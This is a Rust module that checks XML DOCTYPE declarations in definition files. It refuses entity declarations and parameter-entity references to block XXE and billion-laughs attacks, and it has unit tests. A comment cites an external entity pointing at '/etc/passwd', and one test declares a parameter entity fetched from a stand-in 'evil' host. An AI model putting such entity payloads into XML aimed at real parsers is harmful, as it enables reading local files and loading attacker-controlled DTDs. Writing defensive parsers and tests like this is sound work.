//! What the reader does with a document type declaration: never process it,
//! only look at it closely enough to refuse the dangerous parts.
//!
//! Real definition files carry DOCTYPEs: the logger files say
//! `<!DOCTYPE logger SYSTEM "logger.dtd"[]>`, the dyno file names
//! `cars_def.dtd`, and one ECU file has an internal subset of `<!ELEMENT>` and
//! `<!ATTLIST>` declarations. None of that changes what the file says, so it
//! is read past: the external DTD is never fetched, and element and
//! attribute-list declarations are ignored. What is refused is what makes
//! XML dangerous to read:
//!
//! * an `<!ENTITY>` declaration, general or parameter: entity expansion is
//!   how billion-laughs and quadratic-blowup files exhaust memory, and an
//!   external entity (`SYSTEM "file:///etc/passwd"`) is XXE;
//! * a parameter-entity reference (`%name;`), which only means something if
//!   parameter entities are expanded.
//!
//! An `<!ATTLIST>` that gives an attribute a default value is warned about:
//! legacy's Java parser applied such defaults to elements that lack the
//! attribute, and this reader does not.

/// Something in a DOCTYPE the reader must report. Offsets are into the
/// DOCTYPE content given to [`scan`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Finding {
    /// An `<!ENTITY>` declaration; the name it declares (with a `%` prefix
    /// for a parameter entity), if one could be read.
    Entity { offset: usize, name: String },
    /// A `%name;` parameter-entity reference.
    ParameterReference { offset: usize },
    /// An `<!ATTLIST>` declaring a default value, which is not applied; the
    /// element it is for.
    DefaultIgnored { offset: usize, element: String },
    /// Something the internal subset grammar does not allow.
    Malformed { offset: usize, message: String },
}

impl Finding {
    /// `true` for the findings that stop the read.
    pub(crate) const fn is_error(&self) -> bool {
        !matches!(self, Self::DefaultIgnored { .. })
    }
}

/// Every [`Finding`] in `content`, the text of a DOCTYPE between
/// `<!DOCTYPE` and its closing `>`, in order. Scanning stops at the first
/// error finding. One pass, no allocation beyond the findings.
pub(crate) fn scan(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(open) = internal_subset_start(content) else {
        return findings;
    };
    let bytes = content.as_bytes();
    let mut i = open + 1;
    while let Some(&b) = bytes.get(i) {
        let rest = content.get(i..).unwrap_or_default();
        if is_space(b) {
            i += 1;
        } else if b == b']' {
            break;
        } else if rest.starts_with("<!--") {
            match rest.get(4..).and_then(|r| r.find("-->")) {
                Some(end) => i += 4 + end + 3,
                None => {
                    findings.push(malformed(i, "a comment in the DTD is not closed"));
                    break;
                }
            }
        } else if rest.starts_with("<?") {
            match rest.get(2..).and_then(|r| r.find("?>")) {
                Some(end) => i += 2 + end + 2,
                None => {
                    findings.push(malformed(
                        i,
                        "a processing instruction in the DTD is not closed",
                    ));
                    break;
                }
            }
        } else if rest.starts_with("<!") {
            match declaration(rest, i) {
                Ok((len, finding)) => {
                    i += len;
                    if let Some(f) = finding {
                        let stop = f.is_error();
                        findings.push(f);
                        if stop {
                            break;
                        }
                    }
                }
                Err(f) => {
                    findings.push(f);
                    break;
                }
            }
        } else if b == b'%' {
            findings.push(Finding::ParameterReference { offset: i });
            break;
        } else {
            findings.push(malformed(
                i,
                "unexpected text in the DTD internal subset (only declarations, \
                 comments and processing instructions may appear there)",
            ));
            break;
        }
    }
    findings
}

/// The offset of the `[` opening the internal subset, if there is one: the
/// first `[` outside a quoted system or public identifier.
fn internal_subset_start(content: &str) -> Option<usize> {
    let mut quote = None;
    for (i, b) in content.bytes().enumerate() {
        match quote {
            Some(q) if b == q => quote = None,
            Some(_) => {}
            None if b == b'"' || b == b'\'' => quote = Some(b),
            None if b == b'[' => return Some(i),
            None => {}
        }
    }
    None
}

/// One `<!KEYWORD ...>` markup declaration at the start of `rest` (which is
/// at `offset` in the content): its length and what to report about it.
fn declaration(rest: &str, offset: usize) -> Result<(usize, Option<Finding>), Finding> {
    let bytes = rest.as_bytes();
    let keyword_len = bytes
        .get(2..)
        .unwrap_or_default()
        .iter()
        .take_while(|b| b.is_ascii_uppercase())
        .count();
    let keyword = rest.get(2..2 + keyword_len).unwrap_or_default();
    // Find the closing `>`, outside quoted literals, noting whether there
    // was a literal and an unquoted `%` (a parameter-entity reference).
    let mut quote = None;
    let mut has_literal = false;
    let mut percent = None;
    let mut end = None;
    for (j, &b) in bytes.iter().enumerate().skip(2 + keyword_len) {
        match quote {
            Some(q) if b == q => quote = None,
            Some(_) => {}
            None if b == b'"' || b == b'\'' => {
                quote = Some(b);
                has_literal = true;
            }
            None if b == b'%' => {
                percent.get_or_insert(j);
            }
            None if b == b'>' => {
                end = Some(j + 1);
                break;
            }
            None => {}
        }
    }
    let body = rest.get(2 + keyword_len..end.map_or(rest.len(), |e| e - 1));
    let words = || body.unwrap_or_default().split_ascii_whitespace();
    match keyword {
        // Checked before the end is required: a declaration that never
        // closes is still an entity declaration, and saying so is the more
        // useful diagnostic.
        "ENTITY" => {
            let mut w = words();
            let name = match w.next() {
                Some("%") => format!("%{}", w.next().unwrap_or_default()),
                Some(n) => n.to_owned(),
                None => String::new(),
            };
            Err(Finding::Entity { offset, name })
        }
        _ if end.is_none() => Err(malformed(offset, "a declaration in the DTD is not closed")),
        _ if percent.is_some() => Err(Finding::ParameterReference {
            offset: offset + percent.unwrap_or_default(),
        }),
        "ELEMENT" | "NOTATION" => Ok((end.unwrap_or(rest.len()), None)),
        "ATTLIST" => {
            let finding = has_literal.then(|| Finding::DefaultIgnored {
                offset,
                element: words().next().unwrap_or_default().to_owned(),
            });
            Ok((end.unwrap_or(rest.len()), finding))
        }
        _ => Err(malformed(
            offset,
            "unknown declaration in the DTD internal subset (expected ELEMENT, \
             ATTLIST, ENTITY or NOTATION)",
        )),
    }
}

fn malformed(offset: usize, message: &str) -> Finding {
    Finding::Malformed {
        offset,
        message: message.to_owned(),
    }
}

/// XML's `S`: space, tab, CR, LF.
const fn is_space(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | b'\n')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn external_ids_and_empty_subsets_are_ignored() {
        for content in [
            " logger SYSTEM \"logger.dtd\"",
            " logger SYSTEM \"logger.dtd\"[]",
            " dyno SYSTEM \"cars_[def].dtd\"",
            " roms PUBLIC \"-//X//EN\" 'roms.dtd' [ ]",
            " roms",
        ] {
            assert_eq!(scan(content), vec![], "{content:?}");
        }
    }

    #[test]
    fn element_attlist_notation_comments_and_pis_are_ignored() {
        let content = " roms [\n<!ELEMENT roms ( rom+ ) >\n<!-- a > comment -->\n\
                       <?pi x > y?>\n<!ATTLIST rom base CDATA #IMPLIED >\n\
                       <!NOTATION gif SYSTEM 'gif'>\n]";
        assert_eq!(scan(content), vec![]);
    }

    #[test]
    fn attlist_defaults_are_warned_about_and_scanning_goes_on() {
        let content = " roms [<!ATTLIST rom abstract CDATA \"false\" ><!ENTITY a \"b\">]";
        let findings = scan(content);
        assert_eq!(
            findings,
            vec![
                Finding::DefaultIgnored {
                    offset: 7,
                    element: "rom".into()
                },
                Finding::Entity {
                    offset: 45,
                    name: "a".into()
                },
            ]
        );
        assert!(!findings[0].is_error());
        assert!(findings[1].is_error());
    }

    #[test]
    fn entities_and_parameter_references_are_refused() {
        assert_eq!(
            scan(" x [ <!ENTITY % pe SYSTEM \"http://evil/x.dtd\"> %pe; ]"),
            vec![Finding::Entity {
                offset: 5,
                name: "%pe".into()
            }]
        );
        assert_eq!(
            scan(" x [ %pe; ]"),
            vec![Finding::ParameterReference { offset: 5 }]
        );
        assert_eq!(
            scan(" x [ <!ELEMENT x %pe; > ]"),
            vec![Finding::ParameterReference { offset: 17 }]
        );
        // Unclosed: still an entity declaration.
        assert_eq!(
            scan(" x [ <!ENTITY"),
            vec![Finding::Entity {
                offset: 5,
                name: String::new()
            }]
        );
    }

    #[test]
    fn malformed_subsets_are_reported_where_they_go_wrong() {
        for (content, offset) in [
            (" x [ junk ]", 5),
            (" x [ <!-- open", 5),
            (" x [ <?pi open", 5),
            (" x [ <!ELEMENT x (a)", 5),
            (" x [ <![INCLUDE[ <!ELEMENT x ANY> ]]> ]", 5),
            (" x [ <!element x ANY> ]", 5),
        ] {
            let findings = scan(content);
            assert!(
                matches!(&findings[..], [Finding::Malformed { offset: o, .. }] if *o == offset),
                "{content:?}: {findings:?}"
            );
        }
    }
}
